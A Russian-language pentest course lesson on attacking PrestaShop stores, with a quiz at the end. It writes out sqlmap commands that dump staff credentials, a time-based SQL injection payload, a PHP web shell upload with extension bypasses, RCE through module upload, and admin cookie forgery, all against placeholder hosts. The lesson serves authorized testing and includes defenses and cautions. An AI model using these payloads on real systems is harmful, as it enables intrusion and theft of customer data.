---
id: web-prestashop
title: "PrestaShop: SQLi в фильтрах, загрузка файлов и RCE"
category: web
parent: web-cms-ecommerce
difficulty: medium
order: 1
tags: [prestashop, cms, ecommerce, sqli, file-upload, rce, cve]
prerequisites: [web-cms-ecommerce]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 65
summary: "PrestaShop как цель: определение версии, SQLi в параметрах каталога, обход загрузки файлов и путь к RCE через модули."
---

## Вопрос, с которого всё начинается

PrestaShop — один из самых распространённых open-source магазинов. Его часто ставят «на коленке», не обновляют и оставляют админку на дефолтном пути. Для атакующего это значит: старые версии, устаревшие модули и предсказуемые точки входа. Разберём типовую атаку.

## Наш пример: магазин на PrestaShop 1.7

Цель — `https://store.target.example`. Подтверждаем движок по cookie:

```
$ curl -sI https://store.target.example | grep -i set-cookie
set-cookie: PrestaShop-1a2b3c4d...=def50200...; path=/
```

Cookie с префиксом `PrestaShop-` — подпись движка. Точную версию уточняем в статике и по `/?_v=`:

```
$ curl -s 'https://store.target.example/?_v=1.7.8.9' | grep -io 'prestashop [0-9.]*' | head -1
PrestaShop 1.7.8
```

Версия **1.7.8** — у неё есть известные CVE (SQLi, обход загрузки). Дальше — инвентарь модулей.

## Шаг 1: SQLi в параметрах каталога

PrestaShop строит SQL для фильтров и сортировок. Типовые уязвимые параметры: `id_category`, `orderby`, `orderway`, `id_product`. Тест — кавычка:

```
$ curl -s 'https://store.target.example/index.php?controller=category&id_category=3%27' -o /dev/null -w '%{http_code}\n'
500
$ curl -s 'https://store.target.example/index.php?controller=category&id_category=3' -o /dev/null -w '%{http_code}\n'
200
```

Ответ `500` на кавычку — сигнал. Дальше:

```
$ sqlmap -r req.txt -p id_category --batch --level 2 --risk 1 --dbs
available databases [2]:
[*] information_schema
[*] prestashop
```

Извлекаем `ps_employee`:

```
$ sqlmap -r req.txt -p id_category --batch -D prestashop -T ps_employee -C email,passwd --dump
email                | passwd
admin@target.example | $2y$10$...bcrypt...
```

Хэш bcrypt — дальше офлайн-крэк (`hashcat -m 3200`) или поиск в утечках.

## Шаг 2: обход загрузки файлов

PrestaShop позволяет загружать изображения товаров и файлы модулей. Обход строится на двойном расширении и неверной проверке MIME:

```
POST /index.php?controller=AdminProducts&ajax=1&action=...&token=<token>
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

Если сервер проверяет только первые байты или только Content-Type, файл сохраняется как `.jpg` — и не исполняется. Но если где-то в конфиге включён `AddHandler php .jpg` или путь нормализуется (`.php%00.jpg`), обход срабатывает. Поэтому проверяем не только загрузку, но и **как сервер хранит и раздаёт** файл.

## Шаг 3: путь к RCE

Полная цепочка: SQLi → хэш сотрудника → крэк → вход в `/adminXXXX` → установка модуля (ZIP с PHP) или правка шаблона. Модуль PrestaShop — это архив с PHP-файлами; загруженный, он исполняется движком. Это классический путь к RCE.

Если админка недоступна, остаётся прямой баг в модуле: старые версии сторонних модулей часто имеют незащищённую загрузку, вызываемую анонимно.

## Шаг 4: чем помогает сканер

```
$ nuclei -u https://store.target.example -tags prestashop -silent
[CVE-2022-XXXX] [http] [high] https://store.target.example/...
```

И `droopescan`/`cmseek` для подтверждения. Помни: шаблоны nuclei названы по CVE-id, поэтому тег или точный CVE — правильный подход.

## Что мы теперь знаем

- PrestaShop узнаётся по cookie `PrestaShop-*`.
- SQLi живёт в `id_category`, `orderby` и подобных параметрах.
- Хэши сотрудников лежат в `ps_employee` (bcrypt).
- Обход загрузки строится на двойном расширении/MIME.
- RCE достигается через админку и модули.

## Шаг 5: закрепление — цепочка PrestaShop целиком

Соберём всё в одну историю. Цель: PrestaShop 1.7.8. Шаг 1 — cookie `PrestaShop-*` подтверждает движок. Шаг 2 — версия 1.7.8 из статики. Шаг 3 — кавычка в `id_category` даёт 500 (сигнал SQLi). Шаг 4 — `sqlmap` подтверждает boolean-based и выгружает `ps_employee`. Шаг 5 — хэш bcrypt уходит в `hashcat -m 3200`. Шаг 6 — вход в админку по подобранному паролю. Шаг 7 — установка модуля с PHP → RCE.

На каждом шаге — доказательство: код ответа, вывод `sqlmap`, найденный хэш. Без доказательства это лишь предположение.

## Шаг 6: если админка недоступна

Админку часто прячут под случайный путь (`/admin1234`) или закрывают по IP. Тогда работаем с тем, что открыто:

- **API** PrestaShop (`/api/`, WebService) — если ключ слабый или утёк, через него читаются и меняются товары/заказы;
- **устаревшие модули** с прямыми точками входа (загрузка, экспорт);
- **SQLi** — через неё можно не только читать, но и (если есть права) писать: например, вставить новую запись сотрудника с известным хэшем, а затем войти.

Вставка сотрудника — изменение данных, поэтому на проде применяется только при явном разрешении. Безопасная альтернатива — прочитать существующий хэш и подобрать его офлайн.

## Шаг 7: защита и что это значит для атаки

PrestaShop защищается так: обновление ядра и модулей; случайный путь админки; ограничение `/admin` по IP; отключение неиспользуемых модулей; валидация загрузок (белый список расширений, проверка содержимого). Для атакующего вывод: **свежая версия закрывает известные SQLi**, но **логика и модули остаются**. Поэтому не полагайся только на CVE — смотри на конфигурацию и сторонний код.

## Шаг 8: чек-лист по PrestaShop

1. Подтвердить движок (cookie).
2. Определить версию.
3. Перечислить модули и версии.
4. Проверить фильтры каталога на SQLi.
5. Проверить путь и доступность админки.
6. Найти конфиг/бэкапы.
7. Сопоставить версии с CVE.
8. Проверить логику цен/скидок.

## Шаг 9: как найти уязвимый модуль, когда ядро пропатчено

Свежий PrestaShop с обновлённым ядром — не приговор. Атака смещается на **модули**. Их сотни, обновляют их реже, а некоторые вообще заброшены. Методика: собери список модулей (по статике `/modules/<name>/` и по HTML), определи версии (в `config.xml` каждого модуля), сверь с базой CVE и с WPScan-подобными базами для PrestaShop.

```
$ for m in blockreassurance ps_checkout paypal; do
    echo -n "$m -> "
    curl -s "https://store.target.example/modules/$m/config.xml" | grep -o '<version>[^<]*'
  done
blockreassurance -> <version>5.1.0
ps_checkout -> <version>3.4.0
paypal -> <version>5.6.0
```

Каждая версия — кандидат. Дальше ищем CVE и проверяем неразрушающе.

## Шаг 10: как оценивать импакт находки

Импакт в e-commerce считают по **деньгам и данным**, а не по «критичности» абстрактно. Если SQLi даёт дамп заказов — это утечка персональных данных покупателей (регуляторные риски, штрафы). Если даёт креды сотрудника — это доступ к админке (полный контроль магазина). Если даёт ключи платёжного шлюза — это прямой финансовый ущерб.

Поэтому в отчёте всегда указывай: какие данные затронуты, сколько записей, какие системы связаны. «Критично» без цифр — бесполезно заказчику.

## Практика: версия и фингерпринт PrestaShop

PrestaShop определяют по cookie и путям:

```
$ curl -sI https://shop.target.example | grep -iE 'set-cookie|server'
Set-Cookie: PrestaShop-<hash>=...; path=/
```

Cookie `PrestaShop-<hash>` — безошибочный признак. Версия утекает через `/docs/CHANGELOG.txt`, `/install/` (иногда не удалён!), в мета-теге generator и в `/modules/` статике. Особенно важно проверить `/install/`: если установщик не удалён, он позволяет перенастроить магазин — критическая находка сама по себе.

## Практика: SQLi и утечка кредов

В PrestaShop 1.6/1.7 SQLi встречается в фильтрах (модуль `blocklayered`), в `orderby` и в параметрах AJAX-админки. Проверка — time-based в `orderby`:

```
$ curl -s -o /dev/null -w '%{time_total}\n' \
  "https://shop.target.example/category/3?id_category=3&orderby=price,(SELECT(SLEEP(4)))"
4.05
```

Подтверждённая инъекция → sqlmap → дамп `ps_employee` (`email`, `passwd` — bcrypt) и `ps_configuration` (там `PS_COOKIE_KEY` и токены). `passwd` не «расшифровать», но `email` даёт логин в админку, а `PS_COOKIE_KEY` позволяет подделать cookie.

## Практика: админка, модули и загрузка файлов

Админка PrestaShop — кастомный путь (по умолчанию `/admin`, часто переименован). Найти её можно по `robots.txt`, по ссылкам на страницах, или перебором частых имён. После входа — `Modules → Module Manager → Upload a module`: загрузка ZIP с PHP внутри даёт RCE. Это стандартный путь: SQLi/утечка → админка → загрузка модуля → shell. Как всегда, загрузка меняет состояние продакшена, поэтому согласуй с координатором.

## Практика: cookie-подделка

PrestaShop хранит сессию в cookie с `PS_COOKIE_KEY` (из `config/settings.inc.php` или из БД `ps_configuration`). Зная ключ, можно подделать `PrestaShop-<hash>` cookie и войти как админ без пароля — тем же принципом, что WordPress/Django. Ключ читается через LFI `config/settings.inc.php` или через SQLi-дамп.

## Таблица: PrestaShop-векторы

| Вектор | Где | Тип |
|---|---|---|
| SQLi | `orderby`, blocklayered | инъекция |
| LFI | шаблоны, модули | чтение файлов |
| RCE | загрузка модуля | выполнение кода |
| Установщик | `/install/` | перенастройка |
| Cookie-подделка | `PS_COOKIE_KEY` | вход админом |
| Секреты | `settings.inc.php` | креды БД, ключ |

## Как не навредить и как оформить

PrestaShop — магазин с заказами. Не трогай корзины и платежи, не запускай установщик (он сбрасывает данные), не загружай модуль без согласования. Для доказательства хватит дампа `ps_employee.email` и одного time-based подтверждения. В отчёте укажи версию, технику, артефакт и рекомендации: обновить PrestaShop, удалить `/install/`, закрыть `settings.inc.php`, аудит сторонних модулей, ротация `PS_COOKIE_KEY` после инцидента.

## Шпаргалка: команды для PrestaShop

Рабочий набор. Версия: `curl -s https://host/docs/CHANGELOG.txt | head -1`. Признак: `curl -sI https://host | grep -i 'PrestaShop-'`. Установщик: `curl -s -o /dev/null -w '%{http_code}' https://host/install/`. Конфиг: `curl -s https://host/config/settings.inc.php` (если отдаётся). SQLi: time-based в `orderby` на `/category/`. Админка: `/admin`, `/admin123`, кастомный путь из `robots.txt`. Модули: `/modules/`. Порт — 80/443. Фиксируй каждую находку: открытый установщик — critical (перенастройка магазина), а `settings.inc.php` даёт креды БД и `PS_COOKIE_KEY`.

## Квиз

Проверь себя.

```quiz
- question: "По какому признаку узнаётся PrestaShop?"
  options:
    - "По cookie PrestaShop-*"
    - "По /wp-json/"
    - "По /CHANGELOG.txt"
    - "По robots.txt"
  answer: 0
  explanation: "Уникальная cookie движка."
- question: "В какой таблице PrestaShop лежат логины сотрудников?"
  options:
    - "ps_customer"
    - "ps_employee"
    - "ps_order"
    - "ps_product"
  answer: 1
  explanation: "ps_employee — учётки админки."
- question: "На чём строится обход загрузки файлов?"
  options:
    - "На двойном расширении и неверной проверке MIME"
    - "На HTTPS"
    - "На cookie"
    - "На robots.txt"
  answer: 0
  explanation: "shell.php.jpg проходит проверку по расширению."
- question: "Как добить PrestaShop до RCE?"
  options:
    - "Сменой валюты"
    - "Установкой модуля с PHP-кодом из админки"
    - "Очисткой кэша"
    - "Экспортом CSV"
  answer: 1
  explanation: "Модуль исполняется движком."
- question: "Почему SQLi в фильтре опасна именно для магазина?"
  options:
    - "Она замедляет сайт"
    - "Даёт доступ к заказам, клиентам и ключам интеграций"
    - "Она не опасна"
    - "Она меняет тему"
  answer: 1
  explanation: "В БД магазина — деньги и персональные данные."
```

## Куда дальше

Дальше — OpenCart, где похожие SQLi и path traversal. А пока запомни: **в PrestaShop версия → SQLi в фильтре → хэш сотрудника → админка → модуль → RCE.**

## Где пригодится

- Пентест малого и среднего e-commerce (PrestaShop очень популярен).
- Bug bounty: программы магазинов на PrestaShop.
- CTF: задания с магазином и дампом БД.
